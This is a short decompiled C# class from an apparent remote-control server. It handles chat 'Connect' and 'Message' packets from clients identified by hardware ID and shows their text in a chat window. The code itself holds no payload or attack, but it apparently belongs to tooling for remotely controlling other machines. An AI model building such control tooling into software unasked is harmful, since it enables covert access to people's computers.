using System;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x02000063 RID: 99
	internal class HandlerChat
	{
		// Token: 0x060001FD RID: 509 RVA: 0x00020A4C File Offset: 0x0001EC4C
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Message"))
				{
					return;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					return;
				}
				FormChat form = (FormChat)client.Tag;
				form.Invoke(new MethodInvoker(delegate()
				{
					RichTextBox richTextBox = form.richTextBox1;
					richTextBox.Text += (string)objects[2];
					form.richTextBox1.SelectionStart = form.richTextBox1.Text.Length;
					form.richTextBox1.ScrollToCaret();
				}));
				return;
			}
			else
			{
				FormChat form = (FormChat)Application.OpenForms["Chat:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "Chat [" + (string)objects[2] + "]";
					form.client = client;
					form.richTextBox1.Enabled = true;
					form.rjTextBox1.Enabled = true;
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
